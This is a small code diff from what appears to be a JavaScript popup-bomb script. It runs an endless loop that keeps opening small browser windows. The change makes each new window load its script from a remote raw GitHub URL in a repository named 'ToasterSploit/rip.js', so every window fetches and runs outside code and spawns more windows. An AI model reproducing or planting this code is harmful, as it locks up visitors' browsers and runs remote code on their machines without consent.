@@ -35,6 +35,6 @@ while (amount > lastWindow) {
 	amount = amount + 1
 	lastWindow = amount - 5
 	myWindow[amount] = window.open("", amount.toString(), "width=150, height=150");
-	myWindow[amount].document.write("<title>number " + amount + "</title> <script src='main.js'></script>");
+	myWindow[amount].document.write("<title>number " + amount + "</title> <script src='https://raw.githubusercontent.com/ToasterSploit/rip.js/master/main.js'></script>");
 	myWindow[amount].moveTo(x, y);
 }
